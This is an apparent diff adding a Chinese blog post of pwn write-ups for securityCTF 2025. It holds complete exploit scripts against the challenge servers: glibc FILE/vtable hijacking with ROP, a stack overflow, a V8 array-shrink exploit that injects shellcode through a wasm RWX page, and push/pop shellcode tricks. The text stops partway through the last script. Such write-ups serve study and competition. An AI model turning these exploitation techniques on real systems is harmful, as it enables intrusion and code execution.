@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />            
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="referrer" content="origin-when-cross-origin" />
+    <title>securityCTF 2025 pwn方向题解 - imiab - 博客园</title>
+    
+    <meta name="description" content="V-table 手挖io链子 正常的链子 exit_handler() -&amp;gt; io_flush_all() -&amp;gt; io_overflow() -&amp;gt; io_do_write() 我们修改vtable，使得调用overflow变成调用file_finish，正常的finish链子 ex" />    
+    <meta property="og:description" content="V-table 手挖io链子 正常的链子 exit_handler() -&amp;gt; io_flush_all() -&amp;gt; io_overflow() -&amp;gt; io_do_write() 我们修改vtable，使得调用overflow变成调用file_finish，正常的finish链子 ex" />
+    <meta property="og:image" content="https://img2024.cnblogs.com/blog/3562901/202510/3562901-20251011210957036-1403209797.png" />
+    <meta property="bytedance:published_time" content="2025-10-11T21:16:32+08:00" />
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=6O_Ku8w_jYd3yw2BX9ElmxGv25AYbAQ-F6ZeOeZfxYc" />
+    
+    <link id="highlighter-theme-cnblogs" type="text/css" rel="stylesheet" href="/css/hljs/cnblogs.css?v=5J1NDtbnnIr2Rc2SdhEMlMxD4l9Eydj88B31E7_NhS4" />
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/undefined/custom.css?v=M8To7qEiClk5j8&#x2B;gr6sf&#x2B;xNi&#x2B;ok=" />
+    
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/css/mobile-common.min.css?v=a5tjm35tHR3Bq88JZf8V-jiXDhgs5wg823qWgRI6uRY" />
+    
+    <link id="favicon" rel="icon" type="image/x-icon" sizes="32x32" href="https://assets.cnblogs.com/favicon_v3_3.ico" />
+    <link id="favicon_svg" rel="icon" type="image/svg+xml" href="https://assets.cnblogs.com/favicon_v3_3.svg" />
+    <link rel="apple-touch-icon" href="https://assets.cnblogs.com/apple-touch-icon.png?v=2" />
+    <link rel="canonical" href="https://www.cnblogs.com/undefined/p/19135998" />
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/undefined/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/undefined/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/undefined/wlwmanifest.xml" />
+    
+    <script type="application/ld&#x2B;json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BlogPosting",
+      "@id": "https://www.cnblogs.com/undefined/p/19135998",
+      "headline": "securityCTF 2025 pwn方向题解",
+      "description": "V-table 手挖io链子 正常的链子 exit_handler() -\u0026gt; io_flush_all() -\u0026gt; io_overflow() -\u0026gt; io_do_write() 我们修改vtable，使得调用overflow变成调用file_finish，正常的finish链子 exit_handle",
+      "image": [
+        
+      ],
+      "author": {
+        "@type": "Person",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "imiab",
+        "url": "https://www.cnblogs.com/undefined/"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://www.cnblogs.com/",
+        "name": "博客园",
+        "url": "https://www.cnblogs.com/"
+      },
+      "datePublished": "2025-10-11T21:17:00.0000000&#x2B;08:00",
+      "dateModified": "2025-10-11T21:17:00.0000000&#x2B;08:00",
+      "wordCount": "19687",
+      "isPartOf": {
+        "@type": "Blog",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "undefined",
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://www.cnblogs.com/",
+          "name": "博客园"
+        }
+      }
+    }
+    </script>
+
+    <script>
+        var currentBlogId = 841504;
+        var currentBlogApp = 'undefined';
+        var isLogined = false;
+        var isBlogOwner = false;
+        window.isCorp = false;
+        window.skinName = 'Custom';
+        var visitorUserId = '';
+        window.hasCustomScript = true;
+        window.cb_enable_mathjax = false;
+        window.mathEngine = 1;
+        window.codeHighlightEngine = 1;
+        window.enableCodeLineNumber = false;
+        window.codeHighlightTheme = 'cnblogs';
+        window.darkModeCodeHighlightTheme = 'vs2015';
+        window.isDarkCodeHighlightTheme = false;
+        window.isDarkModeCodeHighlightThemeDark = true;
+        window.isDisableCodeHighlighter = false;
+        window.enableCodeThemeTypeFollowSystem = false;
+        window.enableMacStyleCodeBlock = false;        
+    </script>
+        <script>
+            window.currentPostId = 19135998;
+            window.currentPostDateAdded = '2025-10-11 21:17';
+        </script>
+    <script src="https://assets.cnblogs.com/scripts/jquery-3.3.1.min.js"></script>
+    <script src="https://cdn-www.cnblogs.com/js/blog-common.min.js?v=q6A5rdB3tiIeY5Vi562gBAr3OVg5t0HcQVXePY_F0qU"></script>
+        <script>updateCustomBlogReferrer();</script>
+    
+</head>
+<body class="skin-custom has-navbar">
+    <a name="top"></a>
+    <div id="top_nav" class="navbar forpc">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园" role="banner">
+                        <img src="//assets.cnblogs.com/logo.svg" alt="博客园logo" />
+                    </a>
+                </li>
+                <li><a href="https://cnblogs.vip/">会员</a></li>
+                <li><a href="https://cnblogs.vip/store">周边</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-news')">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-q')">博问</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-ing')">闪存</a></li>                
+                <li><a href="https://www.cnblogs.com/cmt/p/19316348">赞助商</a></li>
+                <li><a href="https://chat2db-ai.com/" target="_blank">Chat2DB</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search dropdown" action="https://zzk.cnblogs.com/s" method="get" role="search">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="search" tabindex="3" autocomplete="off" />
+                        <button id="zzk_search_button" onclick="window.navbarSearchManager.triggerActiveOption()">
+                            <img id="search_icon" class="focus-hidden" src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                            <img class="hidden focus-visible" src="//assets.cnblogs.com/icons/enter.svg" alt="搜索" />
+                        </button>
+                        <ul id="navbar_search_options" class="dropdown-menu quick-search-menu">
+                            <li tabindex="0" class="active" onclick="zzkSearch(event, document.getElementById('zzk_search_input').value)">
+                                <div class="keyword-wrapper">
+                                    <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                    <div class="keyword"></div>
+                                </div>
+                                <span class="search-area">所有博客</span>
+                            </li>
+                                    <li tabindex="1" onclick="zzkBlogSearch(event, 'undefined', document.getElementById('zzk_search_input').value)">
+                                        <div class="keyword-wrapper">
+                                            <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                            <div class="keyword"></div>
+                                        </div>
+                                        <span class="search-area">当前博客</span>
+                                    </li>
+                        </ul>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔">
+                        <img id="new_post_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/newpost.svg" alt="写随笔" />
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://www.cnblogs.com/my" alt="我的博客" title="我的博客">
+                        <img id="myblog_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息">
+                        <img id="msg_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/message.svg" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <a id="navbar_lite_mode_indicator" data-current-page="blog" style="display: none" href="javascript:void(0)" alt="简洁模式" title="简洁模式启用，您在访问他人博客时会使用简洁款皮肤展示">
+                        <img class="navbar-icon" src="//assets.cnblogs.com/icons/lite-mode-on.svg" alt="简洁模式" />
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="//assets.cnblogs.com/icons/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://www.cnblogs.com/my">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="https://vip.cnblogs.com/my">会员中心</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <div id="page_begin_html">
+        <div id="loading"><div class="loader-inner"></div></div>
+    </div>
+
+    <div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/undefined/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/undefined">undefined</a>
+</h1>
+<h2></h2>
+
+
+
+
+		
+	</div>
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/undefined/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/imiab">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/undefined/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			<div id="blog_stats_place_holder"><script>loadBlogStats();</script></div>
+		</div>
+	</div>
+</div>
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/undefined/p/19135998" title="发布于 2025-10-11 21:16">
+    
+
+    <span role="heading" aria-level="2">securityCTF 2025 pwn方向题解</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h1 id="v-table">V-table</h1>
+<p>手挖io链子</p>
+<p>正常的链子<br>
+exit_handler() -&gt; io_flush_all() -&gt; io_overflow() -&gt; io_do_write()</p>
+<p>我们修改vtable，使得调用overflow变成调用file_finish，正常的finish链子<br>
+exit_handler() -&gt; io_file_finish() -&gt; io_do_write()</p>
+<p>而实际上我们修改了vtable，finish的位置在overflow-8，因此do_write对应的虚函数也要-8<br>
+exit_handler() -&gt; io_file_finish() -&gt; io_do_read()</p>
+<p>于是我们就拿到了一个任意写<br>
+接下来写chains并打house of cat即可</p>
+<pre><code class="language-python">from pwn import *
+filename = './main'
+libc = ELF("./libc.so.6")
+host= 'pwn-14caf623.p1.securinets.tn'
+port= 9002
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+b _IO_flush_all
+b *(&amp;_IO_flush_all+210)
+b _IO_switch_to_wget_mode
+go
+'''
+
+def pwn():
+    global p
+    p = getp()
+
+    p.recvuntil('0x')
+    libcbase = int(p.recv(12), 16) - libc.sym['_IO_2_1_stdout_']
+    libc.address = libcbase
+    jump = libc.sym['_IO_file_jumps']
+    stdin = libc.sym['_IO_2_1_stdin_']
+    stdout = libc.sym['_IO_2_1_stdout_']
+    print(hex(stdout))
+    file = flat(
+    {
+        0x0:0xfbad1800,
+        0x8:[stdout + 0x801, stdout, stdout+0x800],
+        0x20:[stdout, stdout - 0x800, stdout],
+        0x68:stdout - 0x10,
+        0x88:stdout + 0x1f0,
+        0xb0:0,
+        0xc8:jump-8,
+
+        0x78:stdout + 0x1f0,
+        0x90:stdout
+
+    }, filler = b'\x00'
+    )
+    pay = bytes(file)
+    s(pay)
+
+    fake_io=stdout+0x100
+    IO_wfile_jumps=libc.sym['_IO_wfile_jumps']
+    saddr=libc.sym['system']
+    binsh=libc.search('/bin/sh').__next__()
+
+    magic=0x0000000000154720+libcbase
+    IO_wfile_jumps=libc.sym['_IO_wfile_jumps']
+    setcontext_61=libc.sym['setcontext']+53
+    rdi=libc.search(asm("pop rdi;ret"),executable=True).__next__()
+    rax=libc.search(asm("pop rax;ret"),executable=True).__next__()
+    rsi=libc.search(asm("pop rsi;ret"),executable=True).__next__()
+    sys_ret=libc.search(asm("syscall;ret"),executable=True).__next__()
+    ret=rdi +1
+    saddr=libc.sym['system']
+    Rop=p64(rdi)+p64(binsh)+p64(saddr)
+    orw=p64(setcontext_61)+p64(rdi)+p64(0xFFFFFF9C)
+    # 0x0    rdi             0x8   _IO_read_ptr
+    # 0x10  _IO_read_end     0x18  _IO_read_base
+    # 0x20  _IO_write_base   0x28  _IO_write_ptr
+    # 0x30  _IO_write_end    0x38  _IO_buf_base
+    # 0x40  _IO_buf_end      0x48  _IO_save_base
+    # 0x50  _IO_backup_base  0x58  _IO_save_end
+    # 0x60  _markers         0x68  _chain
+    # 0x70  _fileno          0x74  _flags2
+    # 0x78  _old_offset      0x80  _cur_column
+    # 0x82  _vtable_offset   0x83  _shortbuf
+    # 0x88  _lock            0x90  _offset
+    # 0x98  _codecvt         0xa0  _wide_data
+    # 0xa8  _freeres_list    0xb0  _freeres_buf
+    # 0xb8  __pad5           0xc0  _mode
+    # 0xc4  _unused2         0xd8  vtable
+    # magic:0x176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]
+
+    cat=flat(
+    {
+    0x0:[b'./flag.txt'],     # rdi=binsh
+    0x20:[p64(0)],            # write_base
+    0x28:[p64(1)],            # write_ptr --&gt; ptr &gt; base
+    0xc0:[p64(0)],            # _mode &lt;= 0
+    0xd8:[p64(IO_wfile_jumps+0x30)],
+
+    0x88:[p64(fake_io+0x90),p64(0),p64(1)],   # bypass lock
+
+    0xA0:[p64(fake_io+0xA8),p64(0),p64(1)],
+    (0xA0+0x20):[p64(0)],
+    (0xA0+0x28):[p64(1)],            # bypass check in wfile_seekoff
+    (0xA0+0x30):[p64(1)],            # bypass check in wfile_seekoff
+    (0xB0+0xd8):[p64(fake_io+0xB0+0xd8)], # fake wfile vtable
+    (0xB0+0xd8+0x18):[p64(magic)],   # call entry
+    (0xB0+0xd8+0x18+0x20):[p64(fake_io+0xB0+0xd8+0x18+0x28)],
+    (0xB0+0xd8+0x18+0x48):[p64(setcontext_61)],
+    (0x1C8+0xA0):[p64(fake_io+0x280)],    # rsp
+    (0x1C8+0x68):[p64(0xffffff9c)],       # rdi
+    (0x1C8+0xA8):[p64(rax)],              # ret_addr
+    (0x1C8+0x88):[p64(0x100)],            # rdx
+    (0x1C8+0x70):[p64(fake_io)],          # rsi
+    (0x280):[p64(0x101),p64(sys_ret),            # rop
+    p64(rdi),p64(3),p64(rax),p64(0x0),p64(sys_ret),
+    p64(rax),p64(0x1),p64(rdi),p64(0x1),p64(sys_ret),
+    ]
+    },filler=b'\x00')
+
+    file = flat(
+    {
+        0x58:stdout + 0x100,
+        0x88:stdout + 0x1f0,
+        0xb0:0,
+        0xc8:jump - 8,
+
+        0x78:stdout + 0x1f0,
+        0x90:fake_io
+
+    }, filler = b'\x00'
+    )
+
+    pay = bytes(file).ljust(0x100, b'\x00') + bytes(cat)
+    s(pay)
+
+# write_ptr &lt; write_base (avoid crash in switch to get mode)
+# mode &gt; 0 (trigger IO_overflow)
+# _wide_data-&gt;_IO_write_ptr&gt; _wide_data-&gt;_IO_write_base (trigger IO_overflow)
+# # A0 -&gt; 18 less than A0 -&gt; 20
+# read from _IO_buf_base to _IO_buf_end
+
+# ignore that
+
+# io flush out
+
+# 0x0    rdi             0x8   _IO_read_ptr
+# 0x10  _IO_read_end     0x18  _IO_read_base
+# 0x20  _IO_write_base   0x28  _IO_write_ptr
+# 0x30  _IO_write_end    0x38  _IO_buf_base
+# 0x40  _IO_buf_end      0x48  _IO_save_base
+# 0x50  _IO_backup_base  0x58  _IO_save_end
+# 0x60  _markers         0x68  _chain
+# 0x70  _fileno          0x74  _flags2
+# 0x78  _old_offset      0x80  _cur_column
+# 0x82  _vtable_offset   0x83  _shortbuf
+# 0x88  _lock            0x90  _offset
+# 0x98  _codecvt         0xa0  _wide_data
+# 0xa8  _freeres_list    0xb0  _freeres_buf
+# 0xb8  __pad5           0xc0  _mode
+# 0xc4  _unused2         0xd8  vtable
+# magic:0x176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]
+
+pwn()
+p.interactive()
+</code></pre>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202510/3562901-20251011210957036-1403209797.png" alt="PixPin_2025-10-06_19-11-12" loading="lazy"></p>
+<p>一条亟待复现的链子<br>
+_IO_cleanup-&gt; _IO_unbuffer_all-&gt;_IO_new_file_setbuf-&gt;_IO_default_setbuf-&gt;_IO_new_file_sync-&gt;_IO_do_flush-&gt; _IO_wdo_write-&gt;__libio_codecvt_out</p>
+<p>哦就是apple，不过我还没研究过，有时间再说</p>
+<pre><code class="language-python">from pwn import *
+
+chal = ELF('./main_patched')
+
+HOST = 'pwn-14caf623.p1.securinets.tn'
+PORT =  9002
+
+gdbscript='''
+dir ~/glibc
+b *vuln +54
+c
+'''
+
+context.binary = chal
+context.terminal = ["tmux", "splitw", "-h"]
+
+if args.GDB:
+    conn = gdb.debug([chal.path], gdbscript)
+elif args.REMOTE:
+    conn = remote(HOST, PORT)
+else:
+    conn = process([chal.path])
+
+def main():
+    conn.recvuntil(b': ')
+    
+    addr_stdout = int(conn.recvline().strip(), 0x10)
+    
+    # FIXME
+    addr_libc_base = addr_stdout - 0x1e85c0
+    addr_system = addr_libc_base + 0x53110
+    addr_stdfile_1_lock = addr_libc_base + 0x1e97b0
+    addr_gadget = addr_libc_base + 0x001563c3 # add rdi, 0x10; jmp rcx;
+
+    info(f'{addr_stdout = :#x}')
+    info(f'{addr_libc_base = :#x}')
+    info(f'{addr_system = :#x}')
+    info(f'{addr_stdfile_1_lock = :#x}')
+    info(f'{addr_gadget = :#x}')
+
+    payload = flat({    
+        0x0: 1, #  _flags
+        0x8: addr_system + 0x4,             # _IO_read_ptr (_wide_data-&gt;_IO_write_base),
+        0x10: addr_system + 0x3,            #_IO_read_end (_wide_data-&gt;_IO_write_ptr)
+        0x20: 0,                            # _IO_write_base (_codecvt-&gt;__cd_out-&gt;step-&gt;__shlib_handle)
+        0x28: 1,                            # _IO_write_ptr
+        0x30: b'/bin/sh\0',                 # rdi + 0x10
+        0x38: 0,                            # _IO_buf_base (_wide_data-&gt;_IO_backup_base)
+        0x48: addr_gadget,                  # _IO_save_base (_codecvt-&gt;__cd_out-&gt;step-&gt;__fct)
+        0x50: 0,                            # _IO_backup_base
+        0x58: addr_stdout + 0x20,           # _IO_save_end (_codecvt-&gt;__cd_out-&gt;step) +0x60, +0x68, +0x80 will be overwitten
+        0x88: addr_stdfile_1_lock,          # _lock
+        0x98: addr_stdout + 0x58 - 0x38,    # _codecvt
+        0xa0: addr_stdout + 0x8 - 0x18,     # _wide_data
+        0xc0: 1,  # _mode
+    }, filler=b'\0', length=0xd8)
+
+    conn.send(payload)
+    conn.interactive()
+
+if __name__ == '__main__':  
+    main()
+</code></pre>
+<h1 id="zip">Zip++</h1>
+<p>zip，但是压缩算法不好<br>
+所以有个栈溢出控制到win就结束了</p>
+<pre><code class="language-python">from pwn import *
+filename = './main'
+# libc = ELF("./libc.so.6")
+host= 'pwn-14caf623.p1.securinets.tn'
+port= 9000
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+go
+'''
+
+def pwn():
+
+    global p
+    p = getp()
+    pay = b'\x01\x02' * 198 + b'\xa6' *0x11
+    sa(':',pay)
+    sa(':','exit')
+
+pwn()
+p.interactive()
+</code></pre>
+<h1 id="sukunahikona">Sukunahikona</h1>
+<p>一个简单的v8题</p>
+<pre><code class="language-js">var _b = new ArrayBuffer(16);
+var _f = new Float64Array(_b);
+var _i = new BigUint64Array(_b);
+function f2i(f)
+{
+	_f[0] = f;
+	return _i[0];
+}
+function i2f(i)
+{
+	_i[0] = i;
+	return _f[0];
+}
+function phex(i)
+{
+	console.log("[HEX]: 0x"+i.toString(16).padStart(16,"0"));
+}
+
+let arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 10.10, 11.11, 12.12, 13.13, 14.14, 15.15, 16.16, 17.17, 18.18, 19.19, 20.20];
+let obj_arr = [{}, {}, {}];
+let evil_len = {
+    valueOf: function() {
+        // arr.push({}); // Change the array to HOLEY_ELEMENTS array if needed
+        arr.length = 2;
+        return 19;
+    }
+};
+
+arr.shrink(evil_len);
+
+new ArrayBuffer(0xfe000000);
+new ArrayBuffer(0xfe000000);
+new ArrayBuffer(0xfe000000);
+// %DebugPrint(arr);
+// const map_value = arr[2];
+function show_arr()
+{
+    for (let i = 0; i &lt; arr.length; i++) {
+        phex(f2i(arr[i]));
+    }
+}
+function addr_of(obj)
+{
+    obj_arr[2] = obj;
+    return f2i(arr[6]) &amp; 0xffffffffn;
+}
+
+function read32_at(addr)
+{
+    arr[7] = i2f(((addr-8n) &lt;&lt; 32n) | 0x725n);
+    arr[8] = i2f((0x2n &lt;&lt; 32n) | (0x2n));
+    return f2i(obj_arr[0][0]);  
+}
+
+function write32_at(addr, val)
+{
+    arr[7] = i2f(((addr-8n) &lt;&lt; 32n) | 0x725n);
+    arr[8] = i2f((0x2n &lt;&lt; 32n) | (0x2n));
+    obj_arr[0][0] = i2f(val);
+}
+
+function pwn()
+{
+    darr_map = f2i(arr[2]);
+    oarr_map = f2i(arr[17]);
+    darr_addr = (f2i(arr[3]) + 8n) &amp; 0xffffffffn;
+    oarr_addr = darr_addr + 0x28n;
+    obj0_addr = oarr_addr + 0xcn;
+    phex(obj0_addr);
+    phex(oarr_map);
+
+    arr[6] = i2f((darr_map &amp; 0xffffffffn) &lt;&lt; 32n);
+    // arr[7] = i2f((darr_map &gt;&gt; 32n) | )
+
+    var data_buf = new ArrayBuffer(0x400);
+    var data_view = new DataView(data_buf);
+
+    backing = addr_of(data_buf) + 0x24n;
+    haddr = read32_at(backing);
+    phex(backing);
+    phex(haddr);
+    // %DebugPrint(data_buf);
+    // %DebugPrint(data_view);
+    // %DebugPrint(arr);
+
+    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+    var wasmModule = new WebAssembly.Module(wasmCode);
+    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+    var f = wasmInstance.exports.main;
+
+    f_addr = addr_of(f);
+    instance_addr = read32_at(f_addr + 0x10n) &amp; 0xffffffffn;
+    function_data_addr = read32_at(instance_addr + 4n) &amp; 0xffffffffn;
+    instance_data = read32_at(function_data_addr + 0x14n) &amp; 0xffffffffn;
+    rwx = read32_at(instance_data + 0x30n);
+
+    
+    phex(f_addr);
+    phex(instance_addr);
+    phex(function_data_addr);
+    phex(instance_data);
+    phex(rwx);
+    write32_at(backing, rwx);
+    // %DebugPrint(data_buf);
+
+    shellcode = [
+0x2434810101757968n,
+0x2f66b84801010101n,
+0x4850742e67616c66n,
+0x632f656d6f682fb8n,
+0x31d231e789485074n,
+0xc031050f58026af6n,
+0x4801b6d2315f036an,
+0x315f016a050fe689n,
+0x16ae6894801b6d2n,
+0x50f58n,
+
+
+        ];
+    for (let i = 0; i &lt; shellcode.length; ++i)
+    {
+    data_view.setFloat64(i * 8, i2f(shellcode[i]), true);
+    }
+    f();
+}
+pwn()
+while(1) {}
+
+</code></pre>
+<h1 id="push-pop-all">push pop all</h1>
+<p>在里面藏个bad就会阻断cs的解析</p>
+<p>然后我们用push pop指令再把bad指令写掉，就能正常执行后面的shellcode了</p>
+<pre><code class="language-python">from pwn import *
+import base64
+context.arch = 'amd64'
+context.log_level = 'debug'
+
+host = '127.0.0.1'
+port = 1337
+
+host = 'pwn-14caf623.p1.securinets.tn'
+port = 9001
+
+def pwn():
+    p = remote(host, port)
+    shellcode = asm('pop rax')*8
+    shellcode += asm('push r11; pop rsp; pop rax; pop rbx; push rax;') + b'\x60'
+    shellcode += asm('nop; nop; add rsp, 0x800;' + shellcraft.sh())
+    shellcode = base64.b64encode(shellcode)
+    p.sendline(shellcode)
+    p.interactive()
+    p.close()
+
+pwn()
+</code></pre>
+<h1 id="push-pop-all-revenge">push pop all revenge</h1>
+<p>我不喜欢这道题 TvT</p>
+<p>用 search -2 050f找syscall，然后pop到寄存器里再push到rwx<br>
+或者用canary 1/256拿 0xf</p>
+<p>长度有0x2000，足够我们pop来搜索</p>
+<p>search -w -2 ...</p>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202510/3562901-20251011211051182-1384115691.png" alt="PixPin_2025-10-07_14-23-22" loading="lazy"></p>
+<p>这是第一种办法，肉眼查找法。第一种办法的优化是自己编写一个gdb脚本，将search的结果与栈上指针比对，最后找到一个可以获得0x50f的办法</p>
+<p>第二种办法是用pop sp修改rsp的低位，之前我只知道64位下没有pop eax...但是没想到原来可以pop ax...</p>
+<p>用pop sp 修改 rsp低位为7，然后pop到0x507即可</p>
+<p>第三种做法是控制code的长度，填充我们的shellcode使其长度为0x507，然后找到我们code的源代码，再反照对象的引用路径，最后在栈上找到能跑过去的链子</p>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202510/3562901-20251011211032003-2020548326.png" alt="PixPin_2025-10-07_14-42-56" loading="lazy"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202510/3562901-20251011211037028-1309164138.png" alt="PixPin_2025-10-07_14-43-12" loading="lazy"></p>
+<p>咕咕嘎嘎.mp4<br>
+（不过这里在栈更高位的地方上不去）<br>
+（但是pop sp疑似就上去了）</p>
+<pre><code class="language-python">from pwn import *
+from base64 import *
+filename = "/bin/python"
+# libc = ELF("./libc.so.6")
+host= 'pwn-14caf623.p1.securinets.tn'
+port= 9090
+
+# host = '127.0.0.1'
+# port = 1337
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+
+def run(mode, script = ""):
+    p = remote(host, port)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+go
+'''
+
+def pwn():
+    global p
+    p = getp()
+  
+    shellcode = asm('pop rcx; pop rcx; pop rcx;')
+    shellcode += asm('pop rsp; pop rcx; pop rcx; pop rcx; pop rsp;') + asm('pop rbx')* 397 + asm('pop rsp; pop rcx; pop rcx; pop rcx;')
+    shellcode += asm('pop rcx; pop rsp; pop rcx; pop rcx; pop rbx; push r11; pop rsp;')
